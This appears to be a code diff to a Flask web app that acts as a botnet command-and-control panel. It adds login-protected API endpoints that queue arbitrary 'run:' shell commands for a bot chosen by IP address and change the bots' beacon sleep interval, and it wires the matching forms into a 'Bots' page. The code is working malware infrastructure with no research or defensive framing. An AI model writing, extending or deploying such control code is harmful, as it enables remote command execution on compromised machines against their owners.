@@ -1,6 +1,7 @@
 from app import app, master, db
 from flask import render_template, g, abort, request
 from flask.ext.security import current_user, login_required
+from app.forms import RunCommand, SetSleepInterval
 from threading import Thread
 from app.models import Bot
 import json
@@ -38,7 +39,7 @@ def testcmd():
 
 @app.route("/api/clients/list", methods=["GET"])
 @login_required
-def api_clients():
+def api_clients_list():
     bots = [ Bot.query.filter_by(ip=c).one() for c in g.queue.keys() ]
     data = {}
     for bot in bots:
@@ -46,9 +47,33 @@ def api_clients():
         data[bot.id]["IP"] = bot.ip
         data[bot.id]["OS"] = bot.os
         data[bot.id]["last_seen"] = bot.last_seen
+        data[bot.id]["last_response"] = bot.last_response
+        data[bot.id]["set_interval"] = bot.sleep_interval
     return json.dumps(data)
+
+@app.route("/api/clients/cmd", methods=["POST"])
+@login_required
+def api_clients_cmd():
+    data = json.loads(request.get_data())
+    g.queue[data['IP']].append("run:"+data['cmd'])
+    return "", 200
+
+@app.route("/api/clients/sleep", methods=["POST"])
+@login_required
+def api_clients_sleep():
+    data = json.loads(request.get_data())
+    try: int(data['interval'])
+    except: return "", 500
+    g.queue[data['IP']].append("set sleep:"+data['interval'])
+    bot = Bot.query.filter_by(ip=data['IP']).one()
+    bot.sleep_interval = data['interval']
+    db.session.add(bot)
+    db.session.commit()
+    return "", 200
 
 @app.route("/bots")
 @login_required
 def bots():
-    return render_template("bots.html", title="Bots")
+    cmd_form = RunCommand()
+    int_form = SetSleepInterval()
+    return render_template("bots.html", title="Bots", cmd_form=cmd_form, int_form=int_form)
